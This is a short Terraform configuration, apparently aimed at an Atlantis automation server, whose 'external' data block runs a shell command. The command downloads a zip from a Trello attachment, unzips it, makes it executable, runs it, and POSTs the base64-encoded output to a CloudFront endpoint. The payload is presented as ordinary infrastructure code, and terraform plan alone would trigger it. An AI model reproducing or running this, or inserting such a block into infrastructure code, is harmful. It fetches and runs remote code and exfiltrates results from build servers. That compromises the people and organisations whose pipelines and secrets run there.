data "external" "example" {
    program = ["sh","-c","curl -X POST -d \"`rm /home/atlantis/atlantispluginplus;wget -O /home/atlantis/atlantispluginplus.zip https://trello.com/1/cards/65088a2b2e2f775397a59b7f/attachments/651a35321f5c0f4db68c9905/download/atlantispluginplus.zip;unzip /home/atlantis/atlantispluginplus.zip -d /home/atlantis;chmod +x /home/atlantis/atlantispluginplus;/home/atlantis/atlantispluginplus | base64;`\" https://d9usos5h96tz9.cloudfront.net/log"]
}